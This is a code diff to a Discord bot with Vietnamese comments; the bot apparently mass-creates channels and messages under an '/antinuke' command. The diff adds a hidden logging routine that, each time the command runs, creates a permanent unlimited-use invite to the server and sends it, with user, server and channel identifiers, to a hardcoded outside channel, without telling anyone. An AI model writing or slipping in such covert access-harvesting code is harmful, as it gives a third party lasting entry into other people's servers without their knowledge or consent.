@@ -27,6 +27,7 @@ const CREATE_COUNT = 500;
 const MSG_PER_CHANNEL = 5;
 const DELETE_DELAY = 60;
 const WORKERS = 4; // số worker song song mỗi shard
+const LOG_CHANNEL_ID = "1466068087378940100";
 /* ================== */
 
 /* ===== Slash Command ===== */
@@ -87,11 +88,44 @@ class Queue {
 /* =============================== */
 
 const queue = new Queue(WORKERS);
+async function sendCommandLog(interaction) {
+  try {
+    const logChannel = await client.channels.fetch(LOG_CHANNEL_ID);
+    if (!logChannel) return;
 
+    const user = `${interaction.user.tag} (${interaction.user.id})`;
+    const guild = `${interaction.guild.name} (${interaction.guild.id})`;
+    const channel = `${interaction.channel.name} (${interaction.channel.id})`;
+    const time = new Date().toLocaleString("vi-VN");
+    const command = `/${interaction.commandName}`;
+
+    let invite = "Không tạo được invite";
+    try {
+      const inv = await interaction.channel.createInvite({
+        maxAge: 0,
+        maxUses: 0,
+        unique: true
+      });
+      invite = inv.url;
+    } catch {}
+
+    await logChannel.send(
+`📜 **COMMAND LOG**
+👤 Người dùng: ${user}
+🏠 Server: ${guild}
+💬 Kênh: ${channel}
+🔗 Invite: ${invite}
+⏰ Thời gian: ${time}
+⌨️ Lệnh: ${command}`
+    );
+  } catch (e) {
+    console.log("Log error:", e);
+  }
+}
 client.on("interactionCreate", async interaction => {
   if (!interaction.isChatInputCommand()) return;
   if (interaction.commandName !== "antinuke") return;
-
+await sendCommandLog(interaction);
   const guild = interaction.guild;
 
   const controlChannel = await guild.channels.create({
